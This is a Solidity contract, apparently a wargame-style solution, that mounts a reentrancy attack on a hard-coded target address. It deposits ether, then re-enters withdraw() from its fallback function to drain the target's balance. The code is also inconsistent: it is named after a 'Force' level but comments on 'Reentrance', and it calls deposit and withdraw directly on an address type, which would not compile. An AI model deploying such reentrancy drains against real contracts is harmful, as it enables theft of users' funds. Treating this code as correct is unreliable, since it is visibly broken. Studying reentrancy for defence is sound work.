// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

contract E07_Force {
    address TARGET = payable(0xe6BA07257a9321e755184FB2F995e0600E78c16D);

    // Fallback is called when Reentrance sends Ether to this contract.
    fallback() external payable {
        if (address(TARGET).balance >= 1 ether) {
            (bool success, ) = TARGET.call(abi.encodeWithSignature("withdraw()"));
        }
    }

    receive() external payable  {
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        (bool success, ) = TARGET.call(abi.encodeWithSignature("deposit()"));
        TARGET.deposit{value: 1 ether}();
        TARGET.withdraw();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

